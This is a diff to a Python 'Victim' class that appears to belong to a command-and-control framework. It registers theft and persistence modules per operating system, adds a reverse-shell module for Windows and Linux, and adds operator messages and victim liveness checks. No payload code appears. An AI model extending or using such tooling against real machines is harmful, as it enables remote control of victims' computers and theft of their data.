@@ -22,13 +22,15 @@ class Victim:
 				'browser_history':{'utility': 'collection'},
 				'exfiltration':{'utility': 'collection'},
 				'running_processes':{'utility': 'collection'},
-				'registrykey':{'utility': 'persistence'}
+				'registrykey':{'utility': 'persistence'},
+				'reverseshell': {'utility': 'execution'},
 				},
 
 			'Linux': {
 				'screenshot': {'utility': 'collection'},
 				'exfiltration':{'utility': 'collection'},
 				'running_processes':{'utility': 'collection'},
+				'reverseshell': {'utility': 'execution'},
 			}
 		}
 	language_supported = {
@@ -36,7 +38,8 @@ class Victim:
 		'browser_history': ['powershell','python'],
 		'exfiltration': ['powershell','python'],
 		'running_processes':['powershell','python'],
-		'registrykey':['powershell','python']
+		'registrykey':['powershell','python'],
+		'reverseshell':['python']
 		}
 
 	databasename = os.environ['MONGODB_DATABASE']
@@ -169,6 +172,9 @@ class Victim:
 			if language == '':
 				language = 'python'
 
+			## Maybe somehow tell the attacker that powershell scripts execution is disabled? TODO
+			if language == 'powershell':
+				print(colored("\nNOTE : Windows devices has powershell based scripts execution disabled by default. Try with python as the language in that case.",'yellow'))
 			if language in ['powershell','python']:
 				if language in self.language_supported[module]:
 					return language
@@ -212,6 +218,8 @@ class Victim:
 
 				## Before trying to assign task, see if victim alive
 				self.update_last_seen_status_from_db()
+				self.get_victim_health_status()
+				
 				if self.status == 'Dead':
 					print(colored("\nSorry victim dead, can't assign task",'yellow'))
 					continue
